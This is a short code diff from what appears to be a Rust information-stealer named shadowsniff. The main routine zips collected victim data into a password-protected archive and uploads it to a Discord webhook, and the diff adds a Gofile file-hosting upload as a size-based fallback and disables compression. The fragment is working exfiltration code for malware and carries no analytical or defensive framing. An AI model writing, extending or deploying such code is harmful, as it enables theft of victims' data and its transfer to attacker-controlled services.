@@ -19,12 +19,14 @@ use ipinfo::init_ip_info;
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
 use sender::discord_webhook::DiscordWebhook;
+use sender::gofile::Gofile;
+use sender::size_fallback::SizeFallbackLogFile;
 use sender::LogSender;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::random::ChaCha20RngExt;
-use zip::ZipArchive;
+use zip::{ZipArchive, ZipCompression};
 
 mod panic;
 
@@ -68,13 +70,17 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let zip = ZipArchive::default()
         .add_folder_content(&fs, out)
         .password(&password)
+        .compression(ZipCompression::NONE)
         .comment(displayed_collector)
         .create();
 
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    DiscordWebhook::new(Arc::from(env!("DISCORD_WEBHOOK")))
+    let discord = DiscordWebhook::new(Arc::from(env!("DISCORD_WEBHOOK")));
+    let gofile = Gofile::new(discord.clone());
+
+    SizeFallbackLogFile::new(discord, gofile)
         .send(zip.into(), Some(password), &collector)
         .unwrap();
 
